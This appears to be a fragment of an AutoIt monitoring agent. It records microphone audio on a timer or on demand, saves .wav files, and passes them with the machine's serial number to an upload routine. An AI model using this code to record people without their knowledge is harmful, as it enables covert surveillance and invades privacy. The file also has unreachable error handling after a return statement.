Func microphoneRecording()
	
	Local $epoch=generateDateTime()
	
	Local $durration=$microphoneRecordingDurration
	
	$filename=generateNameFromDateTime()&".wav"
	
	$filePath=@WorkingDir & "\files\microphoneRecordings\"&$filename
	
	if Not FileExists(@WorkingDir & "\files\microphoneRecordings\") Then
		
		DirCreate(@WorkingDir & "\files\microphoneRecordings\")
		
	EndIf
	
	$Media=_MediaCreate(6)
	
	_MediaRecord($Media)
	
	sleep(($durration)*1000)
	
	_MediaStop($Media)
	
	If @error Then
		
		_MediaClose($Media)
		
		handleErrors("microphoneRecording", @error)
		
		Return
	
	Else

		_MediaSave($Media,$filePath)
	
	
		_MediaClose($Media)
		
		
		putMicrophoneRecording($computer_serial,$epoch,$filename,$filePath)

		if @error then 
		
			handleErrors("microphoneRecording", @error)
		
		EndIf
	
		
	EndIf
	
EndFunc



Func microphoneRecordingOnDemand($durration)
	
	Local $epoch=generateDateTime()
	
	$filename=generateNameFromDateTime()&".wav"
	
	$filePath=@WorkingDir & "\files\microphoneRecordings\"&$filename
	
	if Not FileExists(@WorkingDir & "\files\microphoneRecordings\") Then
		
		DirCreate(@WorkingDir & "\files\microphoneRecordings\")
		
	EndIf
	
	$Media=_MediaCreate(6)
	
	_MediaRecord($Media)
	
	sleep(($durration)*1000)
	
	_MediaStop($Media)
	
	If @error Then
		
		_MediaClose($Media)
		
		Return "fail"
	
	Else

		_MediaSave($Media,$filePath)
	
	
		_MediaClose($Media)
		
		
		Return $filePath

		if @error then 
		
			handleErrors("microphoneRecording", @error)
		
		EndIf
	
		
	EndIf
	
EndFunc